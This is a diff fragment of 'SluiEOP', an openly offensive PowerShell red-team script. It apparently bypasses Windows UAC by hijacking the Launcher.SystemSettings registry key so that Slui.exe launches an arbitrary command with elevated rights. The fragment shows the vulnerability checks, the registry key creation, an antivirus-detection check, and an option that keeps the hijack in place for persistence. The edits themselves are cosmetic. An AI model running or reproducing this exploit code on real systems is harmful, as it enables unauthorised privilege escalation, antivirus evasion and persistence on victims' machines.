@@ -92,11 +92,11 @@ If(-not($param1) -or $param1 -eq $null){
 Write-Host "`nSluiEOP v1.10 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
 Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 400
 
-## Check for regedit vulnerable HIVE existence before continue any further ..
+## [1] - Check for regedit vulnerable HIVE existence before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -EA SilentlyContinue
 If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
 
-   ## Check for windows native vulnerable binary existence.  
+   ## [2] - Check for windows native vulnerable binary existence.  
    If(-not(Test-Path -Path "$Env:WINDIR\System32\Slui.exe") -and $param2 -iNotMatch '-Force'){
       If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
       Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
@@ -104,12 +104,12 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
       Exit
    }
 
-   ## Anti-Virus registry Hive|Keys detection checks
+   ## [3] - Anti-Virus registry Hive|Keys detection checks.
    cmd /R REG ADD "HKCU\Software\Classes\Launcher.SystemSettings\shell\Open" /f|Out-Null
    If(-not(Test-Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open") -and $param2 -iNotMatch '-Force'){
       If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
       Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
-      Write-Host "[ ] SluiEOP can't create the required registry key.`n" -ForegroundColor red -BackgroundColor Black
+      Write-Host "[ ] SluiEOP can't create the required registry key. (AV?)`n" -ForegroundColor red -BackgroundColor Black
       Exit
    }
 
@@ -158,7 +158,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
    ## '$LASTEXITCODE' contains the exit code of the last Win32 executable execution
    If($LASTEXITCODE -eq 0){$ReturnCode = "0-"}Else{$ReturnCode = "1-"}
 
-   Start-Sleep -Milliseconds 5800 # Give time for Slui.exe to finish
+   Start-Sleep -Milliseconds 5700 # Give time for Slui.exe to finish
    ## If '$MakeItPersistence' is set to "True" then the EOP registry hacks will NOT
    # be deleted in the end of cmdlet execution, making the 'command' persistence.
    If($MakeItPersistence -eq "False"){
